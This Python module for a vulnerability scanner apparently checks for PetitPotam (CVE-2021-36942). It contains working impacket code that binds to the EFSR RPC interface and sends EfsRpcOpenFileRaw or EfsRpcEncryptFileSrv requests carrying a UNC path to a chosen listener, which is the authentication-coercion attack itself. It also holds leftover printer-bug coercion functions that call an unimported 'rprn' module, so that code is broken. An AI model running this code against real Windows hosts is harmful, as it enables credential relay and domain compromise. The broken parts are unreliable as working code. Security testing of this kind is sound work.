import sys
from ctypes import *
import socket
import struct
import logging

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin

# source: https://github.com/topotam/PetitPotam

class Module:
    name = 'PetitPotam'
    description = 'Check PetitPotam vulnerability (CVE-2021-36942)'

    def run(self, target, args, creds, timeout):
        if len(args) != 1:
            listener_ip = "127.0.0.1"
        else:
            listener_ip = args[0]

        domain = creds['domain'] if 'domain' in creds else None
        user = creds['username'] if 'username' in creds else None
        password = creds['password'] if 'password' in creds else None
        ntlm_hash = creds['hash'] if 'hash' in creds else ''

        check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, timeout)

def check(ip, port, listener_ip, domain, username, password, ntlm_hash, timeout):

    do_kerberos = False
    pipe = 'lsarpc'
    if len(ntlm_hash) != 0:
        lmhash, nthash = ntlm_hash.split(':')
    else:
        lmhash = ''
        nthash = ''

    plop = CoerceAuth()
    dce = plop.connect(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=ip, pipe=pipe, doKerberos=do_kerberos, dcHost=None, targetIp=ip)

    if dce != None:
        vulnerable = plop.EfsRpcOpenFileRaw(dce, listener_ip)

        if vulnerable:
            Output.vuln({'target': 'smb://%s:%d' % (ip, port), 'message': 'Vulnerable to CVE-2021-36942 (PetitPotam)'})

            vuln_info = {
                'hostname': ip,
                'port': port,
                'service': 'smb',
                'url': 'smb://%s:%d' % (ip, port),
                'name': 'CVE-2021-36942 (PetitPotam)',
                'description': 'Server smb://%s:%d is vulnerable to CVE-2021-36942 (PetitPotam)' % (ip, port),
            }
            DB.insert_vulnerability(vuln_info)

        dce.disconnect()

def create_connection(target, domain, username, password, ntlm):
    # set up connection prereqs
    # creds
    creds={}
    creds['username'] = username
    creds['password'] = password
    creds['domain'] = domain
    creds['nthash'] = ntlm
    # to transport
    stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % target
    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], nthash = creds['nthash'])
    dce = rpctransport.get_dce_rpc()

    try:
        dce.connect()
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            return None
        else:
            return None
    # defines the printer endpoint
    try:
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        return None

    return dce

def call_open_printer(dce, target):
    try:
        resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
    except Exception as e:
        dce.disconnect()
        return None
    return resp['pHandle']

def grab_hash(dce, handle, listener):
    try:
        resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(dce, handle, rprn.PRINTER_CHANGE_ADD_JOB, pszLocalMachine='\\\\%s\x00' % listener)
    except Exception as e:
        if str(e).find('RPC_S_SERVER_UNAVAILABLE') >= 0:
            return
        else:
            return

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code


################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )
class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )
class EFS_HASH_BLOB(NDRSTRUCT):
    
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class EFS_RPC_BLOB(NDRSTRUCT):
    
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
    
class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )    
class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )   
class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),
   
    )   
class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )
class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):    
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )   
class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )

################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR), 
        ('Flag', ULONG),
    )
    
class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )
class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )

class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (
        ('FileName', WSTR),
        
    )
class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (
        ('FileName', WSTR),
        
    )
class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcRemoveUsersFromFile(NDRCALL):
    opnum = 8
    structure = (
        ('FileName', WSTR),
        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)
        
    )
class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)
        
    )
class EfsRpcAddUsersToFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )    
class EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ('FileName', WSTR),
        ('infoClass', DWORD),
    )
class EfsRpcFileKeyInfoResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ('SrcFileName', WSTR),
        ('DestFileName', WSTR),
        ('dwCreationDisposition', DWORD),
        ('dwAttributes', DWORD),
        ('RelativeSD', EFS_RPC_BLOB),
        ('bInheritHandle', BOOL),
    ) 
    
class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ('dwFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('dwAttributes', DWORD),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
    ) 
    
class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcFileKeyInfoEx(NDRCALL):
    opnum = 16
    structure = (
        ('dwFileKeyInfoFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('InfoClass', DWORD),
    )
class EfsRpcFileKeyInfoExResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcGetEncryptedFileMetadata(NDRCALL):
    opnum = 18
    structure = (
        ('FileName', WSTR),
    )
class EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )   
class EfsRpcSetEncryptedFileMetadata(NDRCALL):
    opnum = 19
    structure = (
        ('FileName', WSTR),
        ('OldEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),
    )
class EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcEncryptFileExSrv(NDRCALL):
    opnum = 21
    structure = (
        ('FileName', WSTR),
        ('ProtectorDescriptor', WSTR),
        ('Flags', ULONG),
    )
class EfsRpcEncryptFileExSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
#class EfsRpcQueryProtectors(NDRCALL):
#    opnum = 21
#    structure = (
#        ('FileName', WSTR),
#        ('ppProtectorList', PENCRYPTION_PROTECTOR_LIST),
#    )
#class EfsRpcQueryProtectorsResponse(NDRCALL):
#    structure = (
#        ('ErrorCode', ULONG),
#    )

################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    0   : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
    4   : (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
    5   : (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
    6   : (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
    7   : (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
    8   : (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
    9   : (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
    12   : (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
    13   : (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
    15   : (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
    16   : (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),
    18   : (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),
    19   : (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),
    21   : (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),
#    22   : (EfsRpcQueryProtectors, EfsRpcQueryProtectorsResponse),
}
 
class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):
        binding_params = {
            'lsarpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'efsr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % target,
                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
            },
            'samr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'lsass': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'netlogon': {
                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)

        dce = rpctransport.get_dce_rpc()
        #dce.set_auth_type(RPC_C_AUTHN_WINNT)
        #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        #print("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
        try:
            dce.connect()
        except Exception as e:
            #print("Something went wrong, check error status => %s" % str(e))  
            return None
        #print("[+] Connected!")
        #print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            #print("Something went wrong, check error status => %s" % str(e)) 
            return None
        #print("[+] Successfully bound!")
        return dce
        
    def EfsRpcOpenFileRaw(self, dce, listener):
        #print("[-] Sending EfsRpcOpenFileRaw!")
        try:
            request = EfsRpcOpenFileRaw()
            request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            request['Flag'] = 0
            #request.dump()
            resp = dce.request(request)
            
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                #print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                #print('[+] Attack worked!')
                return True
            if str(e).find('rpc_s_access_denied') >= 0:
                #print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
                #print('[+] OK! Using unpatched function!')
                #print("[-] Sending EfsRpcEncryptFileSrv!")
                try:
                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                    resp = dce.request(request)
                except Exception as e:
                    if str(e).find('ERROR_BAD_NETPATH') >= 0:
                        #print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                        #print('[+] Attack worked!')
                        return True
                        pass
                    else:
                        #print("Something went wrong, check error status => %s" % str(e)) 
                        return False
                
            else:
                #print("Something went wrong, check error status => %s" % str(e)) 
                return False
